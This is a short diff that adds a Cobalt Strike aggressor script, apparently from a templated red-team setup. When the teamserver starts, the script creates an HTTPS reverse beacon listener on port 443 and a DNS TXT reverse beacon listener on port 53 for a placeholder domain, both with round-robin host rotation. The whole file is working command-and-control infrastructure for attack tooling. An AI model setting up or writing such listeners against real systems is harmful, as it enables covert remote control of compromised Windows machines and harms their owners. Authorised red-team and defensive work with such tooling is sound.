@@ -1,0 +1,30 @@
+println('listener_service.cna: Loading listener_service.cna...');
+
+on ready{
+    println('listener_service.cna: Creating HTTPS Listener...');
+
+    listener_create_ext(
+    "{{ codename }}-HTTPS",                      # Listener name, use something unique across all teamservers (i.e., server1-http)
+    "windows/beacon_https/reverse_https", # Listener type, remember, payloads are driven by listeners
+    %(host => "{{ domain_name }}",        # Staging host, Only one staging host can be set
+        port => 443,                      # Port for c2 communications
+        beacons => "{{ domain_name }}",   # Comma separated list of beacon hosts
+        strategy => "round-robin"         # Host rotation strategy aka fail strategy
+        )
+    );
+    println('listener_service.cna: HTTPS Listener Created');
+
+    println('listener_service.cna: Creating DNS Listener...');
+
+    listener_create_ext(
+    "{{ codename }}-DNS",                        # Listener name, use something unique across all teamservers (i.e., server1-http)
+    "windows/beacon_dns/reverse_dns_txt", # Listener type, remember, payloads are driven by listeners
+    %(host => "{{ dns_beacon_subdomain }}.{{ domain_name }}",        # Staging host, Only one staging host can be set
+        port => 53,
+        bindto => 53,                      # Port for c2 communications
+        beacons => "{{ dns_beacon_subdomain }}.{{ domain_name }}",   # Comma separated list of beacon hosts
+        strategy => "round-robin"         # Host rotation strategy aka fail strategy
+        )
+    );
+    println('listener_service.cna: DNS Listener Created');
+};
